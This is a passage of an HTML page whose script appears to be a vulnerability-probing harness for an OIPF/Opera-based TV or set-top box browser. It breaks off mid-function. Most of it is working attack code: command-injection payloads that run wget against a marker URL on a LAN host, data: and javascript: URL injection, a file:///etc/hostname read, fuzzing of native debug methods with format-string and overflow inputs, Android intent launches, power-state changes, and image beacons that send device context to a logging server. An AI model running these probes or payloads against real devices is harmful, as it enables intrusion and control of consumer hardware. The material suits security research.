  <pre id="out">Select one test. Results are also sent to the server log.</pre>
  <script>
  (function () {
    var out = document.getElementById('out');
    var urls = {
      http: 'http://192.168.0.163:8888/bridge-child.html',
      data: 'data:text/html,<script>new Image().src="http://192.168.0.163:8888/bridge-log?case=data-executed"<\/script>',
      javascript: 'javascript:(function(){new Image().src="http://192.168.0.163:8888/bridge-log?case=javascript-executed"})()',
      file: 'file:///etc/hostname',
      oipf: 'oipf://test',
      intent: 'intent://test'
    };
    function report(message) {
      out.textContent += '\n' + message;
      try { (new Image()).src = '/bridge-log?result=' + encodeURIComponent(message) + '&t=' + Date.now(); } catch (ignore) {}
    }
    function run(name) {
      if (name === 'jsbluetoothsettings' || name === 'jskeyboardsettings') {
        var settingsAction = name === 'jsbluetoothsettings' ?
          'android.settings.BLUETOOTH_SETTINGS' : 'android.settings.INPUT_METHOD_SETTINGS';
        var settingsIntent = 'intent:#Intent;action=' + settingsAction + ';end';
        report(name + ' START intent=' + settingsIntent);
        try {
          var settingsManager = oipfObjectFactory.createApplicationManagerObject();
          var settingsOwner = settingsManager.getOwnerApplication(document);
          var settingsChild = settingsOwner.createApplication(settingsIntent, true);
          report(name + ' createApplication return=' + typeof settingsChild + ':' + String(settingsChild));
        } catch (settingsCreateError) {
          report(name + ' createApplication THROW=' + settingsCreateError.name + ':' + settingsCreateError.message);
        }
        setTimeout(function () {
          report(name + ' navigating intent fallback');
          try { location.href = settingsIntent; }
          catch (settingsNavigateError) {
            report(name + ' navigation THROW=' + settingsNavigateError.name + ':' + settingsNavigateError.message);
          }
        }, 1200);
        return;
      }
      if (name === 'jsandroidbrowser') {
        var browserUrl = 'http://192.168.0.163:8888/?autorun=fingerprint';
        var browserIntent = 'intent://192.168.0.163:8888/?autorun=fingerprint' +
          '#Intent;scheme=http;action=android.intent.action.VIEW;end';
        report('androidBrowser START intent=' + browserIntent);
        try {
          var browserManager = oipfObjectFactory.createApplicationManagerObject();
          var browserOwner = browserManager.getOwnerApplication(document);
          var browserChild = browserOwner.createApplication(browserIntent, true);
          report('androidBrowser createApplication return=' + typeof browserChild + ':' + String(browserChild));
        } catch (browserCreateError) {
          report('androidBrowser createApplication THROW=' + browserCreateError.name + ':' + browserCreateError.message);
        }
        setTimeout(function () {
          report('androidBrowser navigating intent fallback');
          try { location.href = browserIntent; }
          catch (browserNavigateError) {
            report('androidBrowser intent THROW=' + browserNavigateError.name + ':' + browserNavigateError.message);
            location.href = browserUrl;
          }
        }, 1500);
        return;
      }
      if (name === 'jsopenangle1649exact') {
        location.href = 'http://192.168.0.163:8888/?autorun=angle1649-exact';
        return;
      }
      if (name === 'jsopenangle1649') {
        location.href = 'http://192.168.0.163:8888/?autorun=angle1649';
        return;
      }
      if (name === 'jsopenconcatisolate') {
        location.href = 'http://192.168.0.163:8888/?autorun=concat-isolate';
        return;
      }
      if (name === 'jsopenv8probe') {
        location.href = 'http://192.168.0.163:8888/?autorun=v8';
        return;
      }
      if (name === 'jscmdgrammar') {
        var grammarLog = function (message) { report('cmdGrammar ' + message); };
        var f = oipfObjectFactory;
        var co = null, cc = null;
        try { co = f.createConfigurationObject().configuration; } catch (e0) {}
        try { cc = f.createChannelConfig(); } catch (e1) {}
        var commandTargets = [];
        if (typeof f.debug === 'function') commandTargets.push({name:'factory.debug', object:f, method:f.debug});
        if (co && typeof co.scExtraCmd === 'function') commandTargets.push({name:'configuration.scExtraCmd', object:co, method:co.scExtraCmd});
        if (cc && typeof cc.scExtraCmd === 'function') commandTargets.push({name:'channelConfig.scExtraCmd', object:cc, method:cc.scExtraCmd});
        var commands = ['help','HELP','Help','get','set','read','write','exec','run','shell','system','command',
          'info','dump','diag','diagnostic','log','trace','console','service','network','app','application',
          'platform','omi','pvr','tuner','channel','config','configuration','version','status','list','getVersion',
          'getStatus','getInfo','getSystemInfo','getConfiguration','listCommands'];
        var argumentSets = [];
        for (var ci = 0; ci < commands.length; ci++) {
          var cmd = commands[ci];
          argumentSets.push([cmd]);
          argumentSets.push([cmd, 'OIPF_CANARY_77']);
          argumentSets.push([cmd + ':OIPF_CANARY_77']);
          argumentSets.push([cmd + '=OIPF_CANARY_77']);
          argumentSets.push([JSON.stringify({cmd:cmd, value:'OIPF_CANARY_77'})]);
        }
        argumentSets.push([null]);
        argumentSets.push([undefined]);
        argumentSets.push([true]);
        argumentSets.push([false]);
        argumentSets.push([0]);
        argumentSets.push([1]);
        argumentSets.push([100]);
        argumentSets.push([{}]);
        argumentSets.push([[]]);
        argumentSets.push(['A\x00B']);
        argumentSets.push(['help\x00OIPF_CANARY_77']);
        argumentSets.push(['help', 0]);
        argumentSets.push(['help', null]);
        argumentSets.push(['help', 'OIPF_CANARY_77', 1]);
        var grammarCases = [], gt, ga;
        for (gt = 0; gt < commandTargets.length; gt++) {
          for (ga = 0; ga < argumentSets.length; ga++) {
            grammarCases.push({target:commandTargets[gt], args:argumentSets[ga], shape:ga});
          }
        }
        var grammarIndex = 0;
        grammarLog('START targets=' + commandTargets.length + ';cases=' + grammarCases.length);
        function printableArgs(args) {
          var result = [];
          for (var i = 0; i < args.length; i++) {
            try { result.push(typeof args[i] + ':' + String(args[i]).replace(/\x00/g, '<NUL>')); }
            catch (e) { result.push('unprintable'); }
          }
          return result.join('|');
        }
        function nextGrammarCase() {
          if (grammarIndex >= grammarCases.length) {
            grammarLog('COMPLETE cases=' + grammarIndex);
            return;
          }
          var item = grammarCases[grammarIndex];
          var label = 'case=' + grammarIndex + ';target=' + item.target.name +
                      ';shape=' + item.shape + ';argc=' + item.args.length;
          grammarLog('BEFORE ' + label + ';args=' + printableArgs(item.args).substring(0, 1200));
          try {
            var value = item.target.method.apply(item.target.object, item.args);
            grammarLog('AFTER ' + label + ';return=' + typeof value + ':' + String(value).substring(0, 1200));
          } catch (error) {
            grammarLog('THROW ' + label + ';error=' + error.name + ':' + error.message);
          }
          grammarIndex++;
          setTimeout(nextGrammarCase, 250);
        }
        nextGrammarCase();
        return;
      }
      if (name === 'jsnativeboundaryfuzz') {
        var fuzzLog = function (message) { report('nativeBoundaryFuzz ' + message); };
        var factory = oipfObjectFactory;
        var configObject = null, configuration = null, channelConfig = null;
        try { configObject = factory.createConfigurationObject(); configuration = configObject.configuration; }
        catch (e0) { fuzzLog('configuration.create.THROW=' + e0); }
        try { channelConfig = factory.createChannelConfig(); }
        catch (e1) { fuzzLog('channelConfig.create.THROW=' + e1); }
        var targets = [];
        if (typeof factory.debug === 'function') {
          targets.push({name:'factory.debug', object:factory, method:factory.debug});
        }
        if (configuration && typeof configuration.scExtraCmd === 'function') {
          targets.push({name:'configuration.scExtraCmd', object:configuration, method:configuration.scExtraCmd});
        }
        if (channelConfig && typeof channelConfig.scExtraCmd === 'function') {
          targets.push({name:'channelConfig.scExtraCmd', object:channelConfig, method:channelConfig.scExtraCmd});
        }
        var marker = 'http://192.168.0.163:8888/native-canary';
        var payloads = [
          '', 'help', '?', 'version', 'status', 'list', 'debug',
          'OIPF_CANARY_76', '../', '../../etc/hostname', '/etc/hostname',
          ';wget -qO- ' + marker + '?case=semicolon',
          '&&wget -qO- ' + marker + '?case=and',
          '|wget -qO- ' + marker + '?case=pipe',
          '$(wget -qO- ' + marker + '?case=dollar)',
          '`wget -qO- ' + marker + '?case=backtick`',
          '";wget -qO- ' + marker + '?case=doublequote;#',
          "';wget -qO- " + marker + "?case=singlequote;#",
          '%s%s%s%s', '%n%n%n%n', '\\x00', '{', '{?}',
          new Array(257).join('A'), new Array(1025).join('B'), new Array(4097).join('C')
        ];
        var cases = [];
        for (var ti = 0; ti < targets.length; ti++) {
          for (var pi = 0; pi < payloads.length; pi++) {
            cases.push({target:targets[ti], payload:payloads[pi], payloadIndex:pi});
          }
        }
        var caseIndex = 0;
        fuzzLog('START targets=' + targets.length + ';cases=' + cases.length);
        function nextCase() {
          if (caseIndex >= cases.length) {
            fuzzLog('COMPLETE cases=' + caseIndex);
            return;
          }
          var item = cases[caseIndex];
          var label = 'case=' + caseIndex + ';target=' + item.target.name +
                      ';payloadIndex=' + item.payloadIndex + ';length=' + item.payload.length;
          fuzzLog('BEFORE ' + label + ';payload=' + item.payload.substring(0, 300));
          try {
            var result = item.target.method.call(item.target.object, item.payload);
            fuzzLog('AFTER ' + label + ';return=' + typeof result + ':' + String(result).substring(0, 1000));
          } catch (fuzzError) {
            fuzzLog('THROW ' + label + ';error=' + fuzzError.name + ':' + fuzzError.message);
          }
          caseIndex++;
          setTimeout(nextCase, 750);
        }
        nextCase();
        return;
      }
      if (name === 'jsomideepcapture') {
        var captureCount = 0;
        function captureLog(message) {
          message = String(message);
          for (var offset = 0; offset < message.length || offset === 0; offset += 900) {
            report('omiDeepCapture chunk=' + offset + ';' + message.substring(offset, offset + 900));
            if (!message.length) { break; }
          }
        }
        function inspectValue(label, value) {
          var parts = [label, 'type=' + typeof value];
          try { parts.push('string=' + String(value)); } catch (e0) { parts.push('string.THROW=' + e0); }
          try { parts.push('json=' + JSON.stringify(value)); } catch (e1) { parts.push('json.THROW=' + e1); }
          try {
            var names = [], current = value, depth = 0;
            while (current != null && depth < 5) {
              var currentNames = Object.getOwnPropertyNames(Object(current));
              for (var i = 0; i < currentNames.length; i++) {
                if (names.indexOf(currentNames[i]) < 0) { names.push(currentNames[i]); }
              }
              current = Object.getPrototypeOf(Object(current));
              depth++;
            }
            parts.push('properties=' + names.join(','));
            for (var j = 0; j < names.length && j < 120; j++) {
              try {
                var item = value[names[j]];
                if (item === null || typeof item !== 'object') {
                  parts.push(names[j] + '=' + typeof item + ':' + String(item));
                }
              } catch (propertyError) {
                parts.push(names[j] + '.THROW=' + propertyError);
              }
            }
          } catch (e2) { parts.push('properties.THROW=' + e2); }
          captureLog(parts.join(';'));
        }
        function deepListener() {
          captureCount++;
          captureLog('EVENT#' + captureCount + ';argc=' + arguments.length + ';time=' + Date.now());
          for (var i = 0; i < arguments.length; i++) {
            inspectValue('event' + captureCount + '.arg' + i, arguments[i]);
          }
        }
        try {
          var captureResult = window.opera_omi.addPlatformEventListener(deepListener);
          captureLog('listener-registered;return=' + typeof captureResult + ':' + String(captureResult));
        } catch (captureError) {
          captureLog('listener.THROW=' + captureError.name + ':' + captureError.message);
        }
        setTimeout(function () {
          captureLog('capture-finished;events=' + captureCount);
        }, 300000);
        return;
      }
      if (name === 'jsomiprobenext') {
        var x = window.opera_omi;
        var eventCount = 0;
        function omiLog(message) { report('omiProbeNext ' + message); }
        function listener(label) {
          return function () {
            eventCount++;
            var values = [];
            for (var i = 0; i < arguments.length; i++) {
              try { values.push(typeof arguments[i] + ':' + String(arguments[i])); }
              catch (error) { values.push('unprintable:' + String(error)); }
            }
            omiLog(label + '.event#' + eventCount + ';argc=' + arguments.length +
                   ';args=' + values.join('|'));
          };
        }
        try {
          omiLog('runtimeInfo.memoryControllerEnabled=' + String(x.runtimeInfo.memoryControllerEnabled));
          omiLog('runtimeInfo.memoryLimit=' + String(x.runtimeInfo.memoryLimit));
        } catch (runtimeError) {
          omiLog('runtimeInfo.THROW=' + runtimeError.name + ':' + runtimeError.message);
        }
        for (var listenerIndex = 0; listenerIndex < 3; listenerIndex++) {
          try {
            var listenerResult = x.addPlatformEventListener(listener('listener' + listenerIndex));
            omiLog('listener' + listenerIndex + '.return=' + typeof listenerResult + ':' + String(listenerResult));
          } catch (listenerError) {
            omiLog('listener' + listenerIndex + '.THROW=' + listenerError.name + ':' + listenerError.message);
          }
        }
        var messages = [
          JSON.stringify({cmd:'help'}), JSON.stringify({cmd:'omi'}),
          JSON.stringify({cmd:'platform'}), JSON.stringify({cmd:'app'}),
          JSON.stringify({cmd:'system'}), JSON.stringify({cmd:'pvr'}),
          JSON.stringify({cmd:'tuner'}), 'omi', 'platform', 'app', 'system',
          'pvr', 'tuner', '0', '1', '100', '', '{}', '[]', '{', '{?}',
          JSON.stringify({}), JSON.stringify({command:'help'}),
          JSON.stringify({method:'help'}), JSON.stringify({type:'help'})
        ];
        for (var messageIndex = 0; messageIndex < messages.length; messageIndex++) {
          try {
            var messageResult = x.sendPlatformMessage(messages[messageIndex]);
            omiLog('message' + messageIndex + '=' + messages[messageIndex] +
                   ';return=' + typeof messageResult + ':' + String(messageResult));
          } catch (messageError) {
            omiLog('message' + messageIndex + '=' + messages[messageIndex] +
                   ';THROW=' + messageError.name + ':' + messageError.message);
          }
        }
        omiLog('waiting 15s before localSystem.setPowerState(1)');
        setTimeout(function () {
          try {
            var localSystem = oipfObjectFactory.createConfigurationObject().localSystem;
            omiLog('power.before=' + String(localSystem.powerState) +
                   ';method=' + typeof localSystem.setPowerState +
                   ';arity=' + (localSystem.setPowerState && localSystem.setPowerState.length));
            var powerResult = localSystem.setPowerState(1);
            omiLog('power.return=' + typeof powerResult + ':' + String(powerResult) +
                   ';after=' + String(localSystem.powerState));
          } catch (powerError) {
            omiLog('power.THROW=' + powerError.name + ':' + powerError.message);
          }
        }, 15000);
        setTimeout(function () {
          omiLog('capture-finished;events=' + eventCount);
        }, 120000);
        return;
      }
      if (name === 'jssurfacepanel') {
        report('START jssurfacepanel');
        try {
          report('top.surfaceManager=' + typeof top.surfaceManager +
                 ' showSurface=' + (top.surfaceManager && typeof top.surfaceManager.showSurface));
          var result = top.surfaceManager.showSurface('SERVICE_PANEL');
          report('RETURN jssurfacepanel type=' + typeof result + ' value=' + String(result));
        } catch (error) {
          report('THROW jssurfacepanel name=' + error.name +
                 ' message=' + error.message + ' value=' + String(error));
        }
        return;
      }
      if (name === 'jscontext') {
        var payload = "(function(){var r=[];function a(k,v){try{r.push(k+'='+String(v))}catch(e){r.push(k+'=ERR:'+e)}}a('href',location.href);a('origin',location.origin);a('documentURL',document.URL);a('parentSame',parent.location.href);a('topSame',top.location.href);a('factory',typeof oipfObjectFactory);try{var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);a('manager',typeof m);a('owner',typeof o);a('ownerCreate',typeof o.createApplication);a('ownerDestroy',typeof o.destroyApplication)}catch(e){a('appManagerError',e)}try{var c=oipfObjectFactory.createConfigurationObject();a('configuration',typeof c.configuration);a('localSystem',typeof c.localSystem);a('scExtraCmd',typeof c.configuration.scExtraCmd)}catch(e){a('configError',e)}(new Image()).src='http://192.168.0.163:8888/bridge-log?context='+encodeURIComponent(r.join(';'))})()";
        urls.jscontext = 'javascript:' + payload;
